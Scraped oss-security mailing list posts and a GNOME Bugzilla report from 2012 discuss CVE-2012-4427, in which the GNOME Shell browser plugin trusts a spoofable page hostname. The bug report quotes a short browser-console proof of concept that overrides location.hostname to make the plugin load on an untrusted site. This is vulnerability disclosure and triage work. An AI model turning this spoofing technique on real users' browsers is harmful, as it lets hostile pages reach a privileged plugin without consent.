=== Content from www.openwall.com_d8500e25_20250125_023423.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](2) [[next>]](4) [[<thread-prev]](../../../2012/09/17/8) [[thread-next>]](5) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20120918064329.GA28374@suse.de>
Date: Tue, 18 Sep 2012 08:43:29 +0200
From: Sebastian Krahmer <krahmer@...e.de>
To: oss-security@...ts.openwall.com
Subject: Re: Re: note on gnome shell extensions

Yes, Vincent Untz did:

<https://bugzilla.gnome.org/show_bug.cgi?id=684215>

Sebastian

On Mon, Sep 17, 2012 at 02:28:23PM -0600, Vincent Danen wrote:
> * [2012-09-13 17:43:16 -0600] Kurt Seifried wrote:
>
> Has anyone reported this to upstream yet?
>
>> -----BEGIN PGP SIGNED MESSAGE-----
>> Hash: SHA1
>>
>> On 09/13/2012 11:59 AM, Tavis Ormandy wrote:
>>> Vincent Danen <vdanen@...hat.com> wrote:
>>>
>>>> * [2012-09-13 18:03:33 +0200] Marcus Meissner wrote:
>>>>
>>>>> On Thu, Sep 13, 2012 at 05:39:57PM +0200, Tavis Ormandy wrote:
>>>>>> On Mon, Sep 10, 2012 at 02:48:38PM -0600, Vincent Danen
>>>>>> wrote:
>>>>>>> * [2012-09-08 18:14:10 -0600] Kurt Seifried wrote: SUSE has
>>>>>>> some interesting info in their bug:
>>>>>>>
>>>>>>> <https://bugzilla.novell.com/show_bug.cgi?id=779473#c4>
>>>>>>>
>>>>>>> By the sounds of it, this should be harmless.  Vincent Untz
>>>>>>> says that the browser plugin doesn't actually install the
>>>>>>> extensions, it's passed to another process via a dbus call
>>>>>>> to gnome-shell, which sends the uuid of the extension to
>>>>>>> the extensions.gnome.org web site in order to download the
>>>>>>> extension.
>>>>>>>
>>>>>>> See:
>>>>>>>
>>>>>>> <http://git.gnome.org/browse/gnome-shell/tree/js/ui/shellDBus.js#n305>
>>>>>>>
>>>
>>>>>>>
>> <http://git.gnome.org/browse/gnome-shell/tree/js/ui/extensionDownloader.js#n27>
>>>>>>>
>>>>>>> which is:
>>>>>>>
>>>>>>> let message = Soup.form_request_new_from_hash('GET',
>>>>>>> REPOSITORY_URL_INFO, params);
>>>>>>>
>>>>>>> And REPOSITORY_URL_INFO is hardcoded earlier:
>>>>>>>
>>>>>>> const REPOSITORY_URL_BASE = '<https://extensions.gnome.org>';
>>>>>>> const REPOSITORY_URL_DOWNLOAD = REPOSITORY_URL_BASE +
>>>>>>> '/download-extension/%s.shell-extension.zip'; const
>>>>>>> REPOSITORY_URL_INFO     = REPOSITORY_URL_BASE +
>>>>>>> '/extension-info/'; const REPOSITORY_URL_UPDATE   =
>>>>>>> REPOSITORY_URL_BASE + '/update-info/';
>>>>>>>
>>>>>>> I don't think this is something that can be exploited,
>>>>>>> based on the above.
>>>>>>
>>>>>> Not sure I follow the logic, can't I just upload something
>>>>>> malicious to extensions.gnome.org and then force you to
>>>>>> download it? I mean, I can try it if you're not convinced
>>>>>> it's possible.
>>>>>
>>>>> There are supposed to be reviewers before it gets activated,
>>>>> but exactly this concern Sebastian also voiced.
>>>>>
>>>>>> They surely do not have a magical technique for determining
>>>>>> if my code is or can become malicious.
>>>>>
>>>>> Exactly.
>>>>
>>>> Yeah, this is definitely a possibility, but could happen
>>>> regardless of this with some social engineering (hey, download my
>>>> cool foo extension!) and have something malicious up there.  This
>>>> is pretty much the same thing, just making it easier.
>>>
>>> Well, no. This is like saying it's pointless to patch
>>> vulnerabilities, because I can just make you download malware. You
>>> can't just make me download malware, because I know how to make
>>> trust decisions.
>>>
>>> You could make me download a malicious gnome extension, because you
>>> can do so without interaction or my consent.
>>>
>>>> It's not much different than having a malicious app in the
>>>> iTunes/Android/Whatever app store.  The flaw there isn't so much
>>>> in the app store, but the app.  Wouldn't the same thought apply
>>>> here?
>>>>
>>>
>>> I've uploaded my malicious android app, how do I make you install
>>> it?
>>>
>>> I can create <http://foo.com/malware.rpm>, that's clearly not a
>>> vulnerability and working as designed. But if I can force you to
>>> download and install it without you having the opportunity to make
>>> a trust decision, that clearly is a vulnerability.
>>>
>>> Do you agree that I can upload something malicious to
>>> extensions.gnome.org?
>>>
>>> Do you agree that I can make you install it without consent,
>>> interaction, or the opportunity to make a trust decision?
>>>
>>> If so, then I don't understand the objection :-)
>>>
>>> Tavis.
>>
>> Please use CVE-2012-4427 for this issue.
>>
>>
>>
>> - --
>> Kurt Seifried Red Hat Security Response Team (SRT)
>> PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
>>
>> -----BEGIN PGP SIGNATURE-----
>> Version: GnuPG v1.4.12 (GNU/Linux)
>> Comment: Using GnuPG with Mozilla - <http://www.enigmail.net/>
>>
>> iQIcBAEBAgAGBQJQUm+UAAoJEBYNRVNeJnmTK/AP/3y+9lFhNKhkJ8tAbPoW4BY5
>> l9SRL8b0ikcTH8YgyvUKGj/QErVru1s9V3yLmgXJB3KSPFexGscHQFMGs1zwA1ap
>> LetcxqmOQjCYW+lffqDqBqP8CsL/6acTSUjbEIlhYn9qBPH+rLYlb9i1Hv3zw2Fj
>> h8sD7kTnLJQurcEUB36IuMWncG+ffYlulPam/Jvhr7UpEsBDHzPm1zSJMTaKFxKk
>> eQzGBEuEEZKwcvLXk/6ZR2hqq4B5DBatft39UXGFJlcqUG+EpRcI20Ra4Np1DlKi
>> cQ3hJYAU9je2nmCV48ihNIFY2t8DNCthfqld6xDOaZxRd+GWhOPDR4PifDtO07mF
>> vBpBqXCrOPNybIX3Kt+Lpbt+NqQCRfI0zgG0ipIoNPVGhSeq37flOOeLTC29rYRb
>> Dk0ZARTq00TAJ8mq7FctU31S8qnLjgcjiKoFI9UUU+zk3WL3i6OjfNdkkTWV7T9i
>> hYLkAkPg8OcDm/bOfWnxzLNZRo24bwWi/1ftj0sIs8xOO4QbE94y2/c5Byb0I/2k
>> TIqQdRVruqLLSQ0md7kgxLvkVybzy2A4FYToKMiwmeMByR54C/H/e5TGOxmVLPeD
>> ceqfTyZi2Zp7zWSEgFIwaG6jXD/HV9cpDyQnYeKVaVITCDSPGJgXYN6RZkkpKSEk
>> 3dm76Lc9jTSfg2PeY1Pb
>> =rsga
>> -----END PGP SIGNATURE-----
>
> --
> Vincent Danen / Red Hat Security Response Team

--

~ perl self.pl
~ $_='print"\$_=\47$_\47;eval"';eval
~ krahmer@...e.de - SuSE Security Team

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_63f1007b_20250125_023423.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](18) [[next>]](20) [[<thread-prev]](10) [[thread-next>]](23) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <mpro.maavbm0atu7hc02hi.taviso@cmpxchg8b.com>
Date: Thu, 13 Sep 2012 19:59:46 +0200
From: Tavis Ormandy <taviso@...xchg8b.com>
To: oss-security@...ts.openwall.com
Subject: Re: note on gnome shell extensions

Vincent Danen <vdanen@...hat.com> wrote:

> * [2012-09-13 18:03:33 +0200] Marcus Meissner wrote:
>
> > On Thu, Sep 13, 2012 at 05:39:57PM +0200, Tavis Ormandy wrote:
> > > On Mon, Sep 10, 2012 at 02:48:38PM -0600, Vincent Danen wrote:
> > > > * [2012-09-08 18:14:10 -0600] Kurt Seifried wrote: SUSE has some
> > > > interesting info in their bug:
> >> >
> > > > <https://bugzilla.novell.com/show_bug.cgi?id=779473#c4>
> >> >
> > > > By the sounds of it, this should be harmless.  Vincent Untz says
> > > > that the browser plugin doesn't actually install the extensions,
> > > > it's passed to another process via a dbus call to gnome-shell, which
> > > > sends the uuid of the extension to the extensions.gnome.org web site
> > > > in order to download the extension.
> >> >
> > > > See:
> >> >
> > > > <http://git.gnome.org/browse/gnome-shell/tree/js/ui/shellDBus.js#n305>
> > > >
<http://git.gnome.org/browse/gnome-shell/tree/js/ui/extensionDownloader.js#n27>
> >> >
> > > > which is:
> >> >
> > > > let message = Soup.form_request_new_from_hash('GET',
> > > > REPOSITORY_URL_INFO, params);
> >> >
> > > > And REPOSITORY_URL_INFO is hardcoded earlier:
> >> >
> > > > const REPOSITORY_URL_BASE = '<https://extensions.gnome.org>'; const
> > > > REPOSITORY_URL_DOWNLOAD = REPOSITORY_URL_BASE +
> > > > '/download-extension/%s.shell-extension.zip'; const
> > > > REPOSITORY_URL_INFO     = REPOSITORY_URL_BASE + '/extension-info/';
> > > > const REPOSITORY_URL_UPDATE   = REPOSITORY_URL_BASE +
> > > > '/update-info/';
> >> >
> > > > I don't think this is something that can be exploited, based on the
> > > > above.
> >>
> > > Not sure I follow the logic, can't I just upload something malicious
> > > to extensions.gnome.org and then force you to download it? I mean, I
> > > can try it if you're not convinced it's possible.
> >
> > There are supposed to be reviewers before it gets activated, but exactly
> > this concern Sebastian also voiced.
> >
> > > They surely do not have a magical technique for determining if my code
> > > is or can become malicious.
> >
> > Exactly.
>
> Yeah, this is definitely a possibility, but could happen regardless of
> this with some social engineering (hey, download my cool foo extension!)
> and have something malicious up there.  This is pretty much the same
> thing, just making it easier.

Well, no. This is like saying it's pointless to patch vulnerabilities,
because I can just make you download malware. You can't just make me
download malware, because I know how to make trust decisions.

You could make me download a malicious gnome extension, because you can do
so without interaction or my consent.

> It's not much different than having a malicious app in the
> iTunes/Android/Whatever app store.  The flaw there isn't so much in the
> app store, but the app.  Wouldn't the same thought apply here?
>

I've uploaded my malicious android app, how do I make you install it?

I can create <http://foo.com/malware.rpm>, that's clearly not a vulnerability
and working as designed. But if I can force you to download and install it
without you having the opportunity to make a trust decision, that clearly is
a vulnerability.

Do you agree that I can upload something malicious to extensions.gnome.org?

Do you agree that I can make you install it without consent, interaction, or
the opportunity to make a trust decision?

If so, then I don't understand the objection :-)

Tavis.

--
-------------------------------------
taviso@...xchg8b.com | pgp encrypted mail preferred
-------------------------------------------------------

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from bugzilla.gnome.org_83ef21cd_20250125_023424.html ===


| GNOME Bugzilla â BugÂ 684215 | Possible hostname spoofing in browser plugin | Last modified: 2013-01-03 01:27:59 UTC |
| --- | --- | --- |

|  |
| --- |

* [Home](./)

After an [evaluation](https://wiki.gnome.org/Initiatives/DevelopmentInfrastructure), GNOME has moved from Bugzilla to [GitLab](https://gitlab.gnome.org/). [Learn more about GitLab](https://wiki.gnome.org/GitLab).
**No new issues can be reported in GNOME Bugzilla anymore.**

**To report an issue in a GNOME project, [go to GNOME GitLab](https://gitlab.gnome.org/GNOME)**.
Do **not** go to GNOME Gitlab for: [Bluefish](https://sourceforge.net/p/bluefish/tickets), [Doxygen](https://github.com/doxygen/doxygen/issues), [GnuCash](https://bugs.gnucash.org/), [GStreamer](https://gitlab.freedesktop.org/gstreamer/), [java-gnome](https://github.com/afcowie/java-gnome/issues), [LDTP](https://github.com/ldtp/ldtp2/issues), [NetworkManager](https://gitlab.freedesktop.org/NetworkManager/NetworkManager/issues), [Tomboy](https://github.com/tomboy-notes/tomboy/issues).

[**BugÂ 684215**](show_bug.cgi?id=684215) -
Possible hostname spoofing in browser plugin

|  | |
| --- | --- |
| [Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.") | Possible hostname spoofing in browser plugin |

| | [Status](page.cgi?id=fields.html#bug_status): | RESOLVED WONTFIX | | --- | --- | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | gnome-shell | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Core | | [Component:](describecomponents.cgi?product=gnome-shell "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | extensions | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Other Linux | |  | | | [Importance](page.cgi?id=fields.html#importance): | Normal normal | | [TargetÂ Milestone](page.cgi?id=fields.html#target_milestone): | --- | | [Assigned To](page.cgi?id=fields.html#assigned_to): | gnome-shell-maint | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") | gnome-shell-maint | |  | | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | |  | | | [Depends on:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | | Â | | Â | | Reported: | 2012-09-17 13:39 UTC by Vincent Untz | | --- | --- | | Modified: | 2013-01-03 01:27 UTC | |  | | | [See Also:](page.cgi?id=fields.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [GNOME target:](page.cgi?id=fields.html#cf_gnome_target "A custom Drop Down field in this installation of GNOME Bugzilla.") | --- | | | [GNOME version:](page.cgi?id=fields.html#cf_gnome_version "A custom Drop Down field in this installation of GNOME Bugzilla.") | --- | | |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

|  |  |
| --- | --- |

| [Description](show_bug.cgi?id=684215#c0)  Vincent Untz    2012-09-17 13:39:27 UTC  ``` Forwarding <https://bugzilla.novell.com/show_bug.cgi?id=779473>  This is a report that was sent on the oss-sec mailing list.  ===================  Via OSS-sec:   List, I just installed Fedora 17 on a workstation. While researching how to upgrade gnome 3 to version 2, I noticed it installed a browser extension called "Gnome Shell Integration".  $ rpm -qf /usr/lib64/mozilla/plugins/libgnome-shell-browser-plugin.so gnome-shell-3.4.1-5.fc17.x86_64  The NPPVpluginDescriptionString states "It can be used only by extensions.gnome.org", but I happen to know that is a tricky thing to get right.  102   if (!funcs.getproperty (instance, NPVARIANT_TO_OBJECT (document), 103                           funcs.getstringidentifier ("location"), 104                           &location)) 105     goto out; 106 107   if (!NPVARIANT_IS_OBJECT (location)) 108     goto out; 109 110   hostname = get_string_property (instance, 111                                   NPVARIANT_TO_OBJECT (location), 112                                   "hostname"); 113 114   if (g_strcmp0 (hostname, ORIGIN)) 115     { 116       g_debug ("origin does not match, is %s", 117                hostname); 118 119       goto out; 120     }  I'm familiar with this topic as I wrote a tool for managing broken but necessary plugins by restricting them to trusted domains.  <http://code.google.com/p/nssecurity>  As far as I know, browsers only attempt to prevent tampering with document.location.href, anything else can be modified. For example, this works in Chrome, I don't know the syntax for Mozilla:  > location.__defineGetter__("hostname", function () { return "arbitrary"; })   undefined > location.hostname   "arbitrary"  However,  > location.__defineGetter__("href", function () { return "arbitrary"; })   undefined > location.href   "<http://realurl.test/asdasd>"   So this should fail:  > o = document.createElement('OBJECT')   <object>?</object>? > o.setAttribute('TYPE', 'application/x-gnome-shell-integration')   undefined > document.body.appendChild(o)   <object type=?"application/?x-gnome-shell-integration">?</object>? > o.shellVersion   undefined  But we can re-insert it and make it work:  > document.body.removeChild(o)   <object type=?"application/?x-gnome-shell-integration">?</object>? > location.__defineGetter__("hostname", function () { return "extensions.gnome.org"; })   undefined > document.body.appendChild(o)   <object type=?"application/?x-gnome-shell-integration">?</object>? > o.shellVersion   "3.4.1" > document.location.href   "<https://www.redhat.com/>"  The plugin incorrectly trusted hostname, and initialized. As far as I can tell, the plugin will let you install new shell extensions, I don't know what the impact of that is, can they contain native code?  Tavis. ``` [Comment 1](show_bug.cgi?id=684215#c1)  Vincent Untz    2012-09-17 13:40:19 UTC  ``` I'm not convinced it can actually be exploited (see the discussion in the downstream bug); still something to fix. ``` [Comment 2](show_bug.cgi?id=684215#c2)  Giovanni Campagna    2012-09-17 13:43:57 UTC  ``` It can't be exploited to install extensions (because we only get the UUID from the plugin, and download straight from extensions.gnome.org), but it's a privacy leak none the less. ``` [Comment 3](show_bug.cgi?id=684215#c3)  Jasper St. Pierre (not reading bugmail)    2012-09-17 13:44:18 UTC  ``` That's really disappointing behavior from the browsers, for one. ``` [Comment 4](show_bug.cgi?id=684215#c4)  Vincent Untz    2012-09-17 13:56:09 UTC  ``` (In reply to [comment #2](show_bug.cgi?id=684215#c2)) > It can't be exploited to install extensions (because we only get the UUID from > the plugin, and download straight from extensions.gnome.org), but it's a > privacy leak none the less.  Right, but the last argument on the bug downstream is that if someone manages to upload a malicious extension to e.g.o, then with this bug, a user could think he's installing another extension, and the evil website would pass the UUID of the malicious extension instead.  I'm of the opinion that if have a malicious extension on e.g.o, we're already doing something wrong, anyway, so this bug would simply make something bad a bit worse. ``` [Comment 5](show_bug.cgi?id=684215#c5)  Giovanni Campagna    2012-09-17 14:06:32 UTC  ``` Btw, in Firefox 15 with Object.defineProperty(document.location, 'hostname', { value:'arbitrary' }) (or any combination thereof) I get Error: Permission denied to shadow native property  In Web 3.5.91 with WebKit 1.11.0 (git master), I get TypeError: Attempting to change value of a readonly property. while Object.defineProperty(document.location, 'hostname', { get: function() { return 'arbitrary' } }) gives TypeError: Attempting to change access mechanism for an unconfigurable property.  So this may be less of an issue in modern browsers. ``` [Comment 6](show_bug.cgi?id=684215#c6)  Giovanni Campagna    2013-01-03 01:27:59 UTC  ``` This is not an issue with any of the currently stable browsers, and I'n particular it's not a in issue with the browser we ship, so I'd like to close this. ``` |  |
| --- | --- |

---

---

* + [Home](./)
  + | New
  + | [Browse](page.cgi?id=browse.html&product=gnome-shell)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](page.cgi?id=reports.html)
  + |
    [Help](http://www.bugzilla.org/docs/4.4/en/html/bug_page.html)
  + |
    [Log In](show_bug.cgi?id=684215&GoAheadAndLogIn=1)

    Remember

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=684215&GoAheadAndLogIn=1#forgot)
    Login:

    [x]



=== Content from bugzilla.novell.com_f8d3c1db_20250125_023427.html ===




=== Content from www.openwall.com_08b39abc_20250125_023423.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](25) [[next>]](27) [[<thread-prev]](23) [[thread-next>]](../../../2012/09/17/8) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <50526F94.9050204@redhat.com>
Date: Thu, 13 Sep 2012 17:43:16 -0600
From: Kurt Seifried <kseifried@...hat.com>
To: oss-security@...ts.openwall.com
CC: Tavis Ormandy <taviso@...xchg8b.com>
Subject: Re: Re: note on gnome shell extensions

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

On 09/13/2012 11:59 AM, Tavis Ormandy wrote:
> Vincent Danen <vdanen@...hat.com> wrote:
>
>> * [2012-09-13 18:03:33 +0200] Marcus Meissner wrote:
>>
>>> On Thu, Sep 13, 2012 at 05:39:57PM +0200, Tavis Ormandy wrote:
>>>> On Mon, Sep 10, 2012 at 02:48:38PM -0600, Vincent Danen
>>>> wrote:
>>>>> * [2012-09-08 18:14:10 -0600] Kurt Seifried wrote: SUSE has
>>>>> some interesting info in their bug:
>>>>>
>>>>> <https://bugzilla.novell.com/show_bug.cgi?id=779473#c4>
>>>>>
>>>>> By the sounds of it, this should be harmless.  Vincent Untz
>>>>> says that the browser plugin doesn't actually install the
>>>>> extensions, it's passed to another process via a dbus call
>>>>> to gnome-shell, which sends the uuid of the extension to
>>>>> the extensions.gnome.org web site in order to download the
>>>>> extension.
>>>>>
>>>>> See:
>>>>>
>>>>> <http://git.gnome.org/browse/gnome-shell/tree/js/ui/shellDBus.js#n305>
>>>>>
>
>>>>>
<http://git.gnome.org/browse/gnome-shell/tree/js/ui/extensionDownloader.js#n27>
>>>>>
>>>>> which is:
>>>>>
>>>>> let message = Soup.form_request_new_from_hash('GET',
>>>>> REPOSITORY_URL_INFO, params);
>>>>>
>>>>> And REPOSITORY_URL_INFO is hardcoded earlier:
>>>>>
>>>>> const REPOSITORY_URL_BASE = '<https://extensions.gnome.org>';
>>>>> const REPOSITORY_URL_DOWNLOAD = REPOSITORY_URL_BASE +
>>>>> '/download-extension/%s.shell-extension.zip'; const
>>>>> REPOSITORY_URL_INFO     = REPOSITORY_URL_BASE +
>>>>> '/extension-info/'; const REPOSITORY_URL_UPDATE   =
>>>>> REPOSITORY_URL_BASE + '/update-info/';
>>>>>
>>>>> I don't think this is something that can be exploited,
>>>>> based on the above.
>>>>
>>>> Not sure I follow the logic, can't I just upload something
>>>> malicious to extensions.gnome.org and then force you to
>>>> download it? I mean, I can try it if you're not convinced
>>>> it's possible.
>>>
>>> There are supposed to be reviewers before it gets activated,
>>> but exactly this concern Sebastian also voiced.
>>>
>>>> They surely do not have a magical technique for determining
>>>> if my code is or can become malicious.
>>>
>>> Exactly.
>>
>> Yeah, this is definitely a possibility, but could happen
>> regardless of this with some social engineering (hey, download my
>> cool foo extension!) and have something malicious up there.  This
>> is pretty much the same thing, just making it easier.
>
> Well, no. This is like saying it's pointless to patch
> vulnerabilities, because I can just make you download malware. You
> can't just make me download malware, because I know how to make
> trust decisions.
>
> You could make me download a malicious gnome extension, because you
> can do so without interaction or my consent.
>
>> It's not much different than having a malicious app in the
>> iTunes/Android/Whatever app store.  The flaw there isn't so much
>> in the app store, but the app.  Wouldn't the same thought apply
>> here?
>>
>
> I've uploaded my malicious android app, how do I make you install
> it?
>
> I can create <http://foo.com/malware.rpm>, that's clearly not a
> vulnerability and working as designed. But if I can force you to
> download and install it without you having the opportunity to make
> a trust decision, that clearly is a vulnerability.
>
> Do you agree that I can upload something malicious to
> extensions.gnome.org?
>
> Do you agree that I can make you install it without consent,
> interaction, or the opportunity to make a trust decision?
>
> If so, then I don't understand the objection :-)
>
> Tavis.

Please use CVE-2012-4427 for this issue.

- --
Kurt Seifried Red Hat Security Response Team (SRT)
PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.12 (GNU/Linux)
Comment: Using GnuPG with Mozilla - <http://www.enigmail.net/>

iQIcBAEBAgAGBQJQUm+UAAoJEBYNRVNeJnmTK/AP/3y+9lFhNKhkJ8tAbPoW4BY5
l9SRL8b0ikcTH8YgyvUKGj/QErVru1s9V3yLmgXJB3KSPFexGscHQFMGs1zwA1ap
LetcxqmOQjCYW+lffqDqBqP8CsL/6acTSUjbEIlhYn9qBPH+rLYlb9i1Hv3zw2Fj
h8sD7kTnLJQurcEUB36IuMWncG+ffYlulPam/Jvhr7UpEsBDHzPm1zSJMTaKFxKk
eQzGBEuEEZKwcvLXk/6ZR2hqq4B5DBatft39UXGFJlcqUG+EpRcI20Ra4Np1DlKi
cQ3hJYAU9je2nmCV48ihNIFY2t8DNCthfqld6xDOaZxRd+GWhOPDR4PifDtO07mF
vBpBqXCrOPNybIX3Kt+Lpbt+NqQCRfI0zgG0ipIoNPVGhSeq37flOOeLTC29rYRb
Dk0ZARTq00TAJ8mq7FctU31S8qnLjgcjiKoFI9UUU+zk3WL3i6OjfNdkkTWV7T9i
hYLkAkPg8OcDm/bOfWnxzLNZRo24bwWi/1ftj0sIs8xOO4QbE94y2/c5Byb0I/2k
TIqQdRVruqLLSQ0md7kgxLvkVybzy2A4FYToKMiwmeMByR54C/H/e5TGOxmVLPeD
ceqfTyZi2Zp7zWSEgFIwaG6jXD/HV9cpDyQnYeKVaVITCDSPGJgXYN6RZkkpKSEk
3dm76Lc9jTSfg2PeY1Pb
=rsga
-----END PGP SIGNATURE-----

```

